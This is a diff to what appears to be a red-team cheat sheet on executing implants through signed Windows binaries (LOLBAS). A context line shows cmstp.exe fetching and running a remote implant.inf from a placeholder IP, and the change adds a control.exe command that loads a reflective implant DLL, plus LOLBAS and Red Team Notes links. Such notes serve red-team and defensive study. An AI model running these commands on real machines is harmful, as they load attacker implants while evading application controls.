@@ -129,8 +129,16 @@ Execute fileless implant.
 C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
 ```
 
+## Control
+
+```
+C:\> control.exe .\reflective_implant_loader.dll
+```
+
 ---
 ## References
+
+### LOLBAS
 
 - [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
 
@@ -141,6 +149,10 @@ C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
 - [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)
 
 - [LOLBAS: Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)
+
+- [LOLBAS: Control](https://lolbas-project.github.io/lolbas/Binaries/Control/)
+
+### Red Team Notes
 
 - [Red Team Notes: CMSTP](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)
 
